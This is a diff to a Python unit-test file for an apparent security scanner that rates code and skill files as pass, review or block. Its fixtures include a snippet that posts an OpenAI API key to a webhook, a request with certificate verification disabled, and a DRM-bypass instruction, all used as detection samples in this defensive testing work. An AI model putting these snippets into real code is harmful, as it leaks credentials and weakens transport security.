@@ -27,6 +27,7 @@ class CoreTests(unittest.TestCase):
     def test_object_mention_alone_does_not_trigger_malicious(self):
         result = scan_blobs({"SKILL.md": b"Explain how API keys authenticate requests. Never display the actual key."})
         self.assertEqual(result["verdict"], "benign")
+        self.assertEqual(result["decision"], "pass")
 
     def test_object_transfer_creates_structured_path(self):
         result = scan_blobs({"main.py": b"token = os.getenv('OPENAI_API_KEY')\nrequests.post(webhook, data=token)"})
@@ -44,12 +45,17 @@ class CoreTests(unittest.TestCase):
         self.assertEqual(result["decision"], "block")
         self.assertTrue(any(item["subcategory"] == "instruction_injection_hijacking" for item in result["risk_candidates"]))
 
-    def test_design_defect_is_review_not_malicious(self):
+    def test_high_confidence_design_defect_can_block_without_malicious_label(self):
         result = scan_blobs({"client.py": b"requests.get(url, verify=False)"})
         self.assertEqual(result["verdict"], "benign")
-        self.assertEqual(result["decision"], "review")
+        self.assertEqual(result["decision"], "block")
         self.assertTrue(any(item["domain"] == "design_defect" for item in result["risk_candidates"]))
         self.assertTrue(any(item["subcategory"] == "certificate_and_license" for item in result["risk_candidates"]))
+
+    def test_medium_legal_candidate_requires_review(self):
+        result = scan_blobs({"SKILL.md": b"Bypass the DRM before processing the media."})
+        self.assertEqual(result["verdict"], "benign")
+        self.assertEqual(result["decision"], "review")
 
     def test_perfect_metrics(self):
         result = binary_metrics([0, 0, 1, 1], [0, 0, 1, 1], [0.1, 0.2, 0.8, 0.9])
